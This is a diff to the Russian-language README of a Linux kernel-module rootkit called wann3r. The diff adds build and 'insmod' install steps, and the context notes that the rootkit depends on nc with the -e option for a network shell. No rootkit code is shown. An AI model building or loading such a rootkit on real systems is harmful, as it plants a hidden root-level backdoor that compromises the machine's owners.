@@ -24,5 +24,11 @@ Simple Linux Kernel Module rootkit for 5.x/6.x   x86/64 only
 
 ___ВАЖНО:___ *Убедитесь в наличии утилиты __nc__ с опцией __-e__ на ОС(касается ubuntu), в противном случае скачайте утилиту __ncat__ и поправьте исходный код ( nc->ncat )*
 
+## Установка ##
+```sh
+cd wann3r
+make
+insmod wann3r.ko
+```
 ## Благодарности ##
 Спасибо @Rosee_Maryyy (telegram) за помощь в тестировании.
